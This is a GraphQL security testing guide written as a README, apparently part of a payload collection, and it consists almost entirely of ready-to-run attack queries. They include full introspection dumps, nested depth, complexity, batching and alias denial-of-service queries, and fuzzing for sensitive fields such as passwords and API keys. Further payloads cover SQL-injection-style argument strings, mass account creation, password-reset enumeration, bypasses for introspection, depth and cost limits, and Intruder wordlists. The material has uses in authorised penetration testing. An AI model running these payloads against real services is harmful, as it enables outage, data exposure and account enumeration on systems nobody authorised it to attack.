readme.full_content:
# GraphQL Security Testing

A comprehensive guide to GraphQL vulnerabilities and payloads.

## GraphQL Introspection

### Full Schema Dump
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

### Query Type Discovery
```graphql
query {
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
```

## Common GraphQL Attacks

### 1. Query Depth Attack (DoS)
```graphql
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 2. Query Complexity Attack
```graphql
query {
  user(id: 1) {
    posts(first: 100) {
      edges {
        node {
          comments(first: 100) {
            edges {
              node {
                author {
                  posts(first: 100) {
                    edges {
                      node {
                        title
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 3. Batched Query Attack
```graphql
query BatchAttack {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
  user4: user(id: 4) { email }
  user5: user(id: 5) { email }
  # ... repeat 1000+ times
}
```

### 4. Field Duplication Attack
```graphql
query {
  user(id: 1) {
    name
    name
    name
    name
    # ... repeated 10000 times
    email
    email
    email
  }
}
```

### 5. Introspection-Based Field Fuzzing
```graphql
# Discover hidden fields
query {
  __type(name: "User") {
    fields {
      name
      description
      isDeprecated
    }
  }
}

# Test for sensitive fields
query {
  user(id: 1) {
    id
    email
    password
    ssn
    creditCard
    apiKey
    secretToken
    internalNotes
    resetToken
  }
}
```

### 6. Alias Overloading
```graphql
query {
  a1: user(id: 1) { email }
  a2: user(id: 1) { email }
  a3: user(id: 1) { email }
  # ... 1000 aliases
}
```

### 7. Mutation Abuse
```graphql
# Mass user creation
mutation {
  createUser(input: {email: "test1@test.com", password: "pass"}) { id }
  createUser(input: {email: "test2@test.com", password: "pass"}) { id }
  # ... repeat
}

# Password reset enumeration
mutation {
  requestPasswordReset(email: "admin@company.com") { success }
  requestPasswordReset(email: "user@company.com") { success }
}
```

### 8. GraphQL Injection
```graphql
# In search/filter parameters
query {
  users(search: "admin\" OR \"1\"=\"1") {
    id
    email
  }
}

# In ID parameters
query {
  user(id: "1 OR 1=1") {
    email
  }
}
```

### 9. Directive Abuse
```graphql
# @skip and @include for bypassing auth
query {
  user(id: 1) {
    adminPanel @include(if: true) {
      secretData
    }
  }
}

# @deprecated fields might still work
query {
  user(id: 1) {
    legacyPasswordField @deprecated(reason: "Use passwordHash")
  }
}
```

### 10. Subscription Attacks
```graphql
# DoS via subscriptions
subscription {
  messageSent(roomId: "general") {
    id
    content
    sender
  }
}

# Open many connections
```

## Bypass Techniques

### Disable Introspection Bypass
```graphql
# Try common field names
query {
  __schema { queryType { name } }
  __type(name: "Query") { fields { name } }
}

# Try with fragments
fragment Introspection on __Schema {
  queryType { name }
}
query { ...Introspection }
```

### Depth Limit Bypass
```graphql
# Use fragments to bypass depth limits
fragment UserFragment on User {
  posts {
    author {
      ...UserFragment
    }
  }
}
query {
  user(id: 1) {
    ...UserFragment
  }
}
```

### Cost Analysis Bypass
```graphql
# Use aliases to hide complexity
query {
  u1: user(id: 1) { posts { author { name } } }
  u2: user(id: 2) { posts { author { name } } }
  # Each alias counted separately
}
```

## Testing Tools

### GraphQL Voyager
```bash
npx graphql-voyager --endpoint=https://api.example.com/graphql
```

### InQL (Burp Extension)
- GraphQL security testing in Burp Suite

### GraphQL Cop
```bash
npx graphql-cop --schema=schema.json
```

### Custom Fuzzing
```bash
# Using graphql-fuzzer
npx graphql-fuzzer --endpoint=https://api.example.com/graphql
```

## Payloads for Intruder

### Field Names
```
password
secret
token
apiKey
creditCard
ssn
internalId
adminNotes
resetToken
verificationCode
```

### Query Complexity
```
100
1000
10000
999999
```

### Batch Sizes
```
10
50
100
500
1000
```

